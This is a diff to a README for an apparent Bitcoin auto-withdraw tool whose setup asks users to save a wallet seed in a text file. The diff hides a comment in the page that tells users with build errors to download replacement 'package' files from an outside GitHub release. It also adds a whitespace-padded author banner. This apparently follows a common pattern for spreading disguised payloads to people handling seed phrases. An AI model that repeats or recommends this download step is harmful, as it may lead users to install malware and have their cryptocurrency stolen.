@@ -12,6 +12,8 @@ This Tool is a tool used to perform automatic withdrawals as soon as money arriv
 - Add seed to the `./Release\address.txt` file in the main directory of the project.
 - Select **Build Solution** from the **Build** menu to compile the project or select **Start Without Debugging** from the **Debug** menu or press `Ctrl+F5` to run the project.
 
+<!-- If you get an error during compilation, replace the [package](https://github.com/by-unknown/Bitcoin-Auto-Withdraw/releases/tag/BTCAutoWithdraw) files. -->
+
 ## Requirements
 
 - Visual Studio 2022
@@ -45,3 +47,17 @@ No liability arising from the use or misuse of this software is accepted. Users 
 ## License
 
 This project is licensed under the MIT. For more information, see the [License](LICENSE).
+
+
+<!-- 
+
+
+                                                                                           __                    __                       
+                                                                                          / /  __ __  __ _____  / /__ ___  ___ _    _____ 
+                                                                                         / _ \/ // / / // / _ \/  '_// _ \/ _ \ |/|/ / _ \
+                                                                                        /_.__/\_, /  \_,_/_//_/_/\_\/_//_/\___/__,__/_//_/
+                                                                                             /___/                                        
+
+
+-->
+
